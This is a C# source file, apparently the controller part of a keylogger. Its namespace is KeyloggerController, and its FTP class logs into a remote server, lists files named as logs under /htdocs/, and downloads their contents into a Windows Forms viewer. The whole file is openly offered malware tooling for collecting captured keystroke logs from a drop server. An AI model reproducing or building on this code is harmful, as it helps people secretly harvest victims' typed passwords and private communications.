using System;
using System.Net;
using System.IO;
using System.Windows.Forms;

namespace KeyloggerController
{
    class classFTP
    {
        public static void getLogs(ListBox lstLogs, String strHost, String strUser, String strPass)
        {
            lstLogs.Items.Clear();

            if (validateFTP(strHost, strUser, strPass) == true)
            {
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create(strHost + "/htdocs/");
                request.Credentials = new NetworkCredential(strUser, strPass);
                request.Method = WebRequestMethods.Ftp.ListDirectory;

                using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
                using (Stream responseStream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(responseStream))
                {
                    String strcurrLog = reader.ReadLine();

                    while (reader.EndOfStream == false)
                    {
                        strcurrLog = reader.ReadLine();

                        if (strcurrLog.Contains("Log") && (lstLogs.FindStringExact(strcurrLog) == -1))
                        {
                            lstLogs.Items.Add(strcurrLog);
                            strcurrLog = reader.ReadLine();
                        }
                    }

                    reader.Close();
                    response.Close();
                }
            }
        }

        public static String viewLog(String strLogName, String strHost, String strUser, String strPass)
        {
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(strHost + "/htdocs/" + strLogName);
            request.Credentials = new NetworkCredential(strUser, strPass);
            request.Method = WebRequestMethods.Ftp.DownloadFile;

            using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
            using (Stream responseStream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(responseStream))
            {
                String strDownloadedLog = reader.ReadToEnd();
                return strDownloadedLog;
            }
        }

        public static Boolean validateFTP(String strHost, String strUser, String strPass)
        {
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(strHost);
            request.Credentials = new NetworkCredential(strUser, strPass);
            request.Method = WebRequestMethods.Ftp.ListDirectoryDetails;

            try
            {
                using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
                {
                    response.Close();
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
    }
}
